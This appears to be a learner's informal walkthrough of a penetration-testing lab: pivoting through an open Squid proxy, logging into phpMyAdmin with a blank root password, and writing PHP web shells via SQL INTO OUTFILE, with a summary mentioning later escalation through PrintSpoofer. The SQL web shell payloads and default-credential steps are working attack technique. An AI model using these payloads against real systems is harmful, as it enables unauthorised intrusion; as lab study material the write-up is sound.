This lab demonstrates using a Squid proxy to enumerate open ports on a target and gain initial access via phpMyAdmin with default credentials. Learners will escalate privileges by recovering restricted LOCAL SERVICE privileges through scheduled tasks. Finally, they will exploit the SeImpersonatePrivilege using PrintSpoofer to achieve a SYSTEM shell. This lab emphasizes proxy exploitation, privilege recovery, and abuse of impersonation rights.

- Enumerate open ports behind the Squid proxy to identify accessible services.
- Exploit phpMyAdmin to upload a web shell and establish a reverse shell as LOCAL SERVICE.
- Recover default LOCAL SERVICE privileges using a scheduled task.
- Enable the SeImpersonatePrivilege via a scheduled task with a crafted Principal.
- Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.


ok lets go!!!

```
nmap -sV -sC -T4 -oA initial 192.168.52.189


???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.52.189
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 02:07 +0000
Nmap scan report for 192.168.52.189
Host is up (0.00050s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-31T02:07:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
                                                                                                          
```



```
# curl through the proxy
curl -x http://192.168.52.189:3128 http://127.0.0.1/ #nope
curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/ # HIT!!!!
curl -x http://192.168.52.189:3128 http://192.168.52.189:80/
```

So, `curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/` works.

going to set up firefox to use foxyproxy.

okay. so I need to navigate to http://192.168.52.189:8080. duh. I was trying localhost. oops!

phpinfo. got it.

http://192.168.53.189:8080/?phpinfo=-1

lots of data. too many rabbit holes.

allow_url_fopen	On	On

okay. web shell?

later.

http://192.168.53.189:8080/phpmyadmin/

user: root
password: `<BLANK>`

yep. we can login to phpmyadmin.

maybe we can execute commands.

```
SELECT "<? echo passthru($_GET['pwd']); ?>" INTO OUTFILE 'C:/shell.php' 

USE information_schema;
SELECT load_file("C:/shell.php") from information_schema
```

nope.

```

    index
    next |
    phpMyAdmin 5.0.2 documentation » 
```


let's look for phpmyadmin 5.0.2 vulns.

	DOCUMENT_ROOT 	C:/wamp/www

we can create a webshell.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:/wamp/www/shell.php"
```